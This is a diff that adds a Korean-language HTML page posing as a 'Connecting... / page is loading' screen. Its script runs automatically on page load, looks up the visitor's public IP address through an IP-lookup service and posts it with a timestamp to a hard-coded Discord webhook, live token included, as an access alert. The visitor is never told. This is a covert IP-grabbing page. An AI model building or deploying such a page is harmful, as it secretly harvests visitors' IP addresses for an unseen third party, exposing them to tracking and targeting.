@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <title>연결 중...</title>
+</head>
+<body>
+    <script>
+        async function sendIpToWebhook() {
+            const webhookUrl = "https://discord.com/api/webhooks/1483814045093199985/fm5YZ8V7A33fP0ZtvMh3h5CQuhjV9vFQ40izKC1XZ3eoX6M2pxWBm94iapLxDidFg1iI";
+
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const userIp = data.ip;
+                const now = new Date().toISOString();
+
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "📍 새로운 접속 알림",
+                            color: 5814783,
+                            fields: [
+                                {
+                                    name: "IP 주소",
+                                    value: `\`${userIp}\``,
+                                    inline: true
+                                },
+                                {
+                                    name: "상태",
+                                    value: "✅ 접속 성공",
+                                    inline: true
+                                }
+                            ],
+                            timestamp: now,
+                            footer: {
+                                text: "접속 로그 시스템"
+                            }
+                        }]
+                    })
+                });
+
+                console.log("전송 완료");
+            } catch (error) {
+                console.error("오류 발생 :", error);
+            }
+        }
+
+        window.onload = sendIpToWebhook;
+    </script>
+    <p>페이지를 불러오는 중입니다...</p>
+</body>
+</html>
